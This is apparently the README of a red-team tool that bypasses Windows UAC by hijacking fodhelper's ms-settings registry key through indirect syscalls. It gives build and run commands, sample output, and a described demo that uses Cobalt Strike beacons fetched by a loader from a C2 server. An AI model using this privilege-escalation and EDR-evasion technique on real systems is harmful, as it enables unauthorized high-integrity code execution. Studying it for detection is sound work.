# FODHelperUACBypass_NG
FODHelperUACBypass_NG

## Usage

### Build

The code is written in C#  and based on previous research referenced in the Resources section. It implments the registry key creation, value setting, and deletion steps using indirect syscalls (see [INDIRECT-SYSCALLS.md](INDIRECT-SYSCALLS.md) for details). The rename step uses the Win32 `RegRenameKey` API via P/Invoke.

Being a .Net binary allows us to use it with ExecuteAssembly in-memory execution techniques (supported by most C2 Frameworks), and also makes it easy to modify the payload command without needing to recompile (just change the command line argument).

```powershell
# Using MSBuild
msbuild FODHelperUACBypass_NG\FODHelperUACBypass_NG.csproj /p:Configuration=Release /p:Platform=x64

# Or using Visual Studio
# Open FODHelperUACBypass_NG.sln and build in Release/x64
```

### Run

There's a default payload in the repository for testing purposes (***dialogbox.exe***), but you can specify any executable as the payload.

![image](https://github.com/ThreathuntingAcademy/FODHelperUACBypass_NG/blob/main/dialog.jpg)

```powershell
# Execute the UAC bypass
.\FODHelperUACBypass_NG\bin\x64\Release\FODHelperUACBypass_NG.exe c:\path\to\payload.exe 

# Run diagnostic tests
.\FODHelperUACBypass_NG\bin\x64\Release\FODHelperUACBypass_NG.exe -test
```

### Blog 

A blog post and detailed explanation of the technique can be found in the blog post: [FODHelper UAC Bypass NG](https://threathuntingacademy.github.io/2026/02/27/FOD.html)

### Youtube Demo

[![FODHelperUACBypass_NG Demo](https://img.youtube.com/vi/VIDEO_ID/0.jpg)](https://www.youtube.com/watch?v=VIDEO_ID)

In the demo we use actual `cobaltstrike` payloads and an evasive loader written in .net to demonstrate the technique in a real-world scenario. The payloads are generated with `cobaltstrike`, the loader fetches them and then executes them via the UAC bypass (resulting in a beacon in high integrity).

- The Evasive Loader is a simple .Net assembly that fetches the payload from a C2 server and executes it in-memory. It is designed to be used as the payload for the UAC bypass, allowing us to demonstrate the technique with real Cobalt Strike beacons. (this is not the purpose of this project, but it serves as a good demonstration of how the UAC bypass can be used in a real attack scenario)

- The evasive loader **needs to be present on the target system** before running the UAC bypass, as it is the payload that will be executed when the hijacked registry key is triggered by `fodhelper.exe`. In a real attack scenario, the attacker would need to find a way to get the evasive loader onto the target system (e.g. via phishing, file drop, etc.) before executing the UAC bypass.

### Expected Output

```
[*] Creating registry key via indirect syscalls...
[+] Registry key created successfully.
[+] DelegateExecute value set.
[+] Default value set to payload command.
[*] Waiting 10 seconds...
[*] Starting fodhelper.exe...
[+] Fodhelper started successfully.
[*] Waiting 5 seconds...
[*] Removing registry key via indirect syscalls...
[+] Registry key removed successfully.
[+] Operation completed.
```

### Diagnostic Tests

```powershell
.\FODHelperUACBypass_NG.exe -test
```

**Output:**
```
[TEST 1] Getting ntdll base address...
[+] ntdll.dll base: 0x7FFD4DA20000

[TEST 2] Resolving NtClose function...
[+] NtClose address: 0x7FFD4DB81C20

[TEST 3] Extracting syscall number for NtClose...
[+] NtClose SSN: 0xF

[TEST 4] Finding syscall instruction for NtClose...
[+] syscall instruction at: 0x7FFD4DB81C32

[TEST 5] Testing NtDelayExecution (sleep 1 second)...
[+] Slept for 1005ms

[TEST 6] Testing registry path construction...
[+] NT path: \Registry\User\S-1-5-21-...\Software\Classes\ms-settings\Shell\Open\command
```

---

## Resources

- **Original Research**: EvasiveSyscallInjector project (working x64 implementation)
- **Hell's Gate**: VX Underground - Direct Syscalls paper
- **Halo's Gate**: Sektor7 - Evading EDR with Halos Gate
- **NT API Documentation**: Undocumented NT Functions (ntinternals.net)
- **Fodhelper UAC Bypass**: @winscripting (original technique)

---

## Security Notice

**Legal and Ethical Use Only**

This code is provided for:
- ✅ Authorized security research
- ✅ Red team operations with proper authorization
- ✅ Penetration testing on systems you own/have permission to test
- ✅ Educational purposes in controlled environments

**Do NOT use for:**
- ❌ Unauthorized access to computer systems
- ❌ Malicious purposes
- ❌ Any illegal activities

Unauthorized computer access is illegal under laws including the Computer Fraud and Abuse Act (USA), Computer Misuse Act (UK), and similar laws worldwide.

**Always obtain written authorization before testing!**

---

## Credits

Implementation based on techniques from:
- **EvasiveSyscallInjector** - Working x64 indirect syscall implementation
- **Hell's Gate** - SSN extraction technique (VX Underground)
- **Halo's Gate** - Hooked function SSN inference (Sektor7)
- **SysWhispers** - Syscall generation framework (jthuraisamy)
- **Fodhelper UAC bypass** - Original technique (@winscripting)

---

(*) Part of this code and documentation has been optimized by Anthropic Opus 4.5 for clarity, accuracy, and completeness.
*Last Updated: 2026-03-02*
